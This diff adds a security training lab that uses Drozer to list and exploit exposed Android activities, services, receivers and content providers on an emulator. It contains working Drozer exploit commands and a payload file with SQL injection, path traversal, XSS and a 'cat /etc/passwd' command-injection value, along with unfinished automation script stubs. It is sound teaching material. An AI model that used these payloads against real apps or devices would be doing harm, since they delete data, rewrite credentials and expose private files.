@@ -1,0 +1,515 @@
+Abuse Exposed Components via Drozer
+Objectives
+By the end of this lab, students will be able to:
+
+Install and configure Drozer framework for Android security testing
+Identify exposed Android components (Activities, Services, Broadcast Receivers, Content Providers)
+Craft and deliver exploit payloads to vulnerable components
+Automate component scanning using Python scripts
+Document security findings and recommend mitigations
+Prerequisites
+Basic understanding of Android application architecture and components
+Familiarity with Linux command line and ADB commands
+Python programming fundamentals
+Understanding of mobile application security concepts
+Lab Environment
+Al Nafi Cloud Machine: Click Start Lab to access your pre-configured Linux environment with all necessary tools installed.
+
+Pre-installed Tools:
+
+Android SDK and ADB
+Python 3.x with pip
+Drozer framework
+Android emulator with vulnerable test applications
+Task 1: Environment Setup and Drozer Installation
+Step 1.1: Verify Android Environment
+Check that ADB and the Android emulator are working:
+
+# Check ADB installation
+adb version
+
+# List connected devices
+adb devices
+
+# Start emulator if needed
+emulator -avd test_device -no-snapshot &
+
+# Wait 30 seconds for boot, then verify
+adb devices
+Expected output should show a device in the list (e.g., emulator-5554 device).
+
+Step 1.2: Install Drozer Framework
+Install Drozer and dependencies:
+
+# Update package manager
+sudo apt update
+
+# Install dependencies
+sudo apt install -y python3-pip python3-dev
+
+# Install Drozer
+pip3 install drozer
+
+# Verify installation
+drozer --help
+Step 1.3: Install and Configure Drozer Agent
+Download and install the Drozer agent on the Android device:
+
+# Download Drozer agent APK
+wget https://github.com/FSecureLABS/drozer/releases/download/2.4.4/drozer-agent-2.4.4.apk
+
+# Install on device
+adb install drozer-agent-2.4.4.apk
+
+# Verify installation
+adb shell pm list packages | grep drozer
+
+# Set up port forwarding
+adb forward tcp:31415 tcp:31415
+Manual Steps on Emulator:
+
+Open Drozer Agent app
+Toggle "Embedded Server" to ON
+Confirm server is listening on port 31415
+Step 1.4: Connect to Drozer Console
+Establish connection to the Drozer agent:
+
+# Connect to Drozer
+drozer console connect
+
+# You should see the prompt: dz>
+Test the connection with a basic command:
+
+dz> run app.package.list
+Task 2: Identify Exposed Components
+Step 2.1: Reconnaissance Commands
+Use Drozer to discover installed packages and their components:
+
+# List all installed packages
+dz> run app.package.list
+
+# Get detailed package information
+dz> run app.package.info -a com.android.browser
+
+# List packages with specific permissions
+dz> run app.package.list -p android.permission.INTERNET
+Step 2.2: Scan for Exposed Activities
+Identify activities that can be launched externally:
+
+# List all exported activities
+dz> run app.activity.info
+
+# Search activities for specific package
+dz> run app.activity.info -a com.example.vulnerable
+
+# Find activities with intent filters
+dz> run app.activity.info -i
+Step 2.3: Scan for Exposed Services
+Find services accessible to external applications:
+
+# List all exported services
+dz> run app.service.info
+
+# Search services for specific package
+dz> run app.service.info -a com.example.vulnerable
+Step 2.4: Scan for Broadcast Receivers
+Identify broadcast receivers that accept external intents:
+
+# List all exported receivers
+dz> run app.broadcast.info
+
+# Search receivers for specific package
+dz> run app.broadcast.info -a com.example.vulnerable
+Step 2.5: Scan for Content Providers
+Discover content providers that may expose data:
+
+# List all content providers
+dz> run app.provider.info
+
+# Find providers for specific package
+dz> run app.provider.info -a com.example.vulnerable
+
+# Test provider access
+dz> run app.provider.query content://com.example.provider/data
+Task 3: Exploit Exposed Components
+Step 3.1: Exploit Activities
+Launch activities with malicious intents:
+
+# Basic activity launch
+dz> run app.activity.start --component com.example.vulnerable com.example.MainActivity
+
+# Launch with custom data
+dz> run app.activity.start --component com.example.vulnerable com.example.MainActivity --extra string username admin --extra string password test123
+
+# Launch with file URI
+dz> run app.activity.start --component com.example.vulnerable com.example.FileActivity --data-uri file:///etc/passwd
+
+# Launch with custom action
+dz> run app.activity.start --action android.intent.action.VIEW --data-uri http://malicious-site.com
+Step 3.2: Exploit Services
+Interact with vulnerable services:
+
+# Start a service
+dz> run app.service.start --component com.example.vulnerable com.example.BackgroundService
+
+# Start service with data
+dz> run app.service.start --component com.example.vulnerable com.example.DataService --extra string data "malicious_payload"
+
+# Stop a service
+dz> run app.service.stop --component com.example.vulnerable com.example.BackgroundService
+Step 3.3: Exploit Broadcast Receivers
+Send malicious broadcasts:
+
+# Send custom broadcast
+dz> run app.broadcast.send --action com.example.CUSTOM_ACTION --extra string command "test_command"
+
+# Send system broadcast
+dz> run app.broadcast.send --action android.intent.action.BOOT_COMPLETED
+
+# Send broadcast with data URI
+dz> run app.broadcast.send --action android.intent.action.VIEW --data-uri "file:///data/data/com.example.app/databases/sensitive.db"
+Step 3.4: Exploit Content Providers
+Query and manipulate data through providers:
+
+# Query provider
+dz> run app.provider.query content://com.example.provider/users
+
+# Insert data (SQL injection test)
+dz> run app.provider.insert content://com.example.provider/users --string name "admin'; DROP TABLE users; --" --string password "test"
+
+# Update data
+dz> run app.provider.update content://com.example.provider/users --selection "name='admin'" --string password "hacked"
+
+# Delete data
+dz> run app.provider.delete content://com.example.provider/users --selection "1=1"
+Task 4: Automate Scanning with Python
+Step 4.1: Create Component Scanner Script
+Create a Python script to automate component discovery:
+
+# File: component_scanner.py
+#!/usr/bin/env python3
+
+import subprocess
+import sys
+
+class ComponentScanner:
+    def __init__(self, package_name=None):
+        self.package_name = package_name
+        self.results = {
+            'activities': [],
+            'services': [],
+            'receivers': [],
+            'providers': []
+        }
+    
+    def run_drozer_command(self, command, timeout=30):
+        """
+        Execute a Drozer command and return output.
+        
+        Args:
+            command: Drozer command to execute
+            timeout: Command timeout in seconds
+        
+        Returns:
+            Command output as string or None on failure
+        """
+        # TODO: Build full command with drozer console connect
+        # TODO: Execute subprocess with timeout
+        # TODO: Handle errors and return output
+        pass
+    
+    def scan_activities(self):
+        """
+        Scan for exposed activities.
+        
+        Returns:
+            List of discovered activities
+        """
+        # TODO: Build appropriate drozer command
+        # TODO: Execute command and parse output
+        # TODO: Store results in self.results['activities']
+        pass
+    
+    def scan_services(self):
+        """
+        Scan for exposed services.
+        
+        Returns:
+            List of discovered services
+        """
+        # TODO: Implement service scanning
+        pass
+    
+    def scan_receivers(self):
+        """
+        Scan for exposed broadcast receivers.
+        
+        Returns:
+            List of discovered receivers
+        """
+        # TODO: Implement receiver scanning
+        pass
+    
+    def scan_providers(self):
+        """
+        Scan for exposed content providers.
+        
+        Returns:
+            List of discovered providers
+        """
+        # TODO: Implement provider scanning
+        pass
+    
+    def run_full_scan(self):
+        """
+        Execute complete component scan.
+        """
+        print(f"[+] Starting scan for package: {self.package_name or 'all'}")
+        
+        # TODO: Call all scan methods
+        # TODO: Print summary of findings
+        # TODO: Save results to file
+        pass
+    
+    def save_results(self, filename="scan_results.txt"):
+        """
+        Save scan results to file.
+        
+        Args:
+            filename: Output file name
+        """
+        # TODO: Format results as text report
+        # TODO: Write to file
+        pass
+
+if __name__ == "__main__":
+    package = sys.argv[1] if len(sys.argv) > 1 else None
+    scanner = ComponentScanner(package)
+    scanner.run_full_scan()
+Step 4.2: Create Exploitation Automation Script
+Develop a script to automate payload delivery:
+
+# File: exploit_automation.py
+#!/usr/bin/env python3
+
+import subprocess
+import time
+import json
+
+class ExploitAutomation:
+    def __init__(self, target_package):
+        self.target_package = target_package
+        self.payloads = []
+        self.results = []
+    
+    def load_payloads(self, payload_file):
+        """
+        Load exploit payloads from JSON file.
+        
+        Args:
+            payload_file: Path to payload configuration file
+        """
+        # TODO: Read JSON file
+        # TODO: Parse payload definitions
+        # TODO: Store in self.payloads
+        pass
+    
+    def exploit_activity(self, activity_name, extras=None, data_uri=None):
+        """
+        Exploit an exposed activity.
+        
+        Args:
+            activity_name: Target activity name
+            extras: Dictionary of intent extras
+            data_uri: Data URI to include
+        
+        Returns:
+            True if successful, False otherwise
+        """
+        # TODO: Build drozer command with parameters
+        # TODO: Execute command
+        # TODO: Check if activity launched successfully
+        # TODO: Record result
+        pass
+    
+    def exploit_service(self, service_name, extras=None):
+        """
+        Exploit an exposed service.
+        
+        Args:
+            service_name: Target service name
+            extras: Dictionary of intent extras
+        
+        Returns:
+            True if successful, False otherwise
+        """
+        # TODO: Implement service exploitation
+        pass
+    
+    def exploit_receiver(self, action, extras=None):
+        """
+        Exploit a broadcast receiver.
+        
+        Args:
+            action: Broadcast action
+            extras: Dictionary of intent extras
+        
+        Returns:
+            True if successful, False otherwise
+        """
+        # TODO: Implement receiver exploitation
+        pass
+    
+    def test_sql_injection(self, component_type, component_name):
+        """
+        Test component for SQL injection vulnerabilities.
+        
+        Args:
+            component_type: Type of component (activity/service/receiver)
+            component_name: Component name
+        """
+        # TODO: Define SQL injection payloads
+        # TODO: Deliver payloads to component
+        # TODO: Analyze responses
+        pass
+    
+    def test_path_traversal(self, component_type, component_name):
+        """
+        Test component for path traversal vulnerabilities.
+        
+        Args:
+            component_type: Type of component
+            component_name: Component name
+        """
+        # TODO: Define path traversal payloads
+        # TODO: Deliver payloads
+        # TODO: Check for successful exploitation
+        pass
+    
+    def run_exploitation(self):
+        """
+        Execute all exploitation tests.
+        """
+        print(f"[+] Starting exploitation of {self.target_package}")
+        
+        # TODO: Iterate through payloads
+        # TODO: Execute each exploit
+        # TODO: Record results
+        # TODO: Generate report
+        pass
+    
+    def generate_report(self, output_file="exploit_report.json"):
+        """
+        Generate exploitation report.
+        
+        Args:
+            output_file: Report file name
+        """
+        # TODO: Format results as JSON
+        # TODO: Include success/failure statistics
+        # TODO: Write to file
+        pass
+
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) < 2:
+        print("Usage: python3 exploit_automation.py <package_name>")
+        sys.exit(1)
+    
+    exploiter = ExploitAutomation(sys.argv[1])
+    exploiter.run_exploitation()
+Step 4.3: Create Payload Configuration File
+Create a JSON file to define test payloads:
+
+{
+  "activity_payloads": [
+    {
+      "name": "SQL Injection",
+      "extras": {
+        "query": "'; DROP TABLE users; --"
+      }
+    },
+    {
+      "name": "Path Traversal",
+      "data_uri": "file://../../etc/passwd"
+    },
+    {
+      "name": "XSS Payload",
+      "extras": {
+        "message": "<script>alert('XSS')</script>"
+      }
+    }
+  ],
+  "broadcast_payloads": [
+    {
+      "name": "Command Injection",
+      "action": "com.example.EXECUTE_COMMAND",
+      "extras": {
+        "command": "cat /etc/passwd"
+      }
+    }
+  ]
+}
+Step 4.4: Run Automated Scans
+Execute your automation scripts:
+
+# Make scripts executable
+chmod +x component_scanner.py exploit_automation.py
+
+# Run component scanner
+python3 component_scanner.py com.example.vulnerable
+
+# Run exploitation automation
+python3 exploit_automation.py com.example.vulnerable
+
+# Review results
+cat scan_results.txt
+cat exploit_report.json
+Expected Outcomes
+After completing this lab, you should have:
+
+Successfully installed and configured Drozer framework
+Identified multiple exposed Android components
+Exploited vulnerable components using manual Drozer commands
+Created Python automation scripts for scanning and exploitation
+Generated comprehensive security reports documenting findings
+Key Findings to Document:
+
+Number and types of exposed components discovered
+Successfully exploited vulnerabilities
+Potential security impact of each vulnerability
+Recommended security mitigations
+Troubleshooting Tips
+Issue: Drozer console won't connect
+
+Solution: Verify port forwarding with adb forward --list, restart Drozer agent on device, ensure emulator is fully booted
+Issue: Commands timeout or hang
+
+Solution: Increase timeout values in scripts, check device responsiveness with adb shell, restart ADB server with adb kill-server && adb start-server
+Issue: No exposed components found
+
+Solution: Verify target package is installed with adb shell pm list packages, ensure you're scanning the correct package name, try scanning all packages without -a flag
+Issue: Python scripts fail to execute Drozer commands
+
+Solution: Check Drozer is in PATH with which drozer, verify subprocess command syntax, test commands manually in Drozer console first
+Conclusion
+This lab demonstrated how to use Drozer framework to identify and exploit exposed Android components. You learned to:
+
+Perform reconnaissance to discover vulnerable components
+Craft exploit payloads for Activities, Services, Broadcast Receivers, and Content Providers
+Automate security testing using Python scripts
+Document security findings systematically
+Security Best Practices:
+
+Always set android:exported="false" for components that don't need external access
+Implement permission checks for exported components
+Validate all input data received through intents
+Use signature-level permissions for inter-app communication
+Regularly audit applications for exposed components
+Next Steps:
+
+Test your automation scripts against multiple applications
+Expand payload definitions to cover additional vulnerability types
+Integrate findings into a comprehensive security assessment report
+Research advanced Drozer modules for deeper analysis
+Remember: These techniques should only be used for authorized security testing and educational purposes.
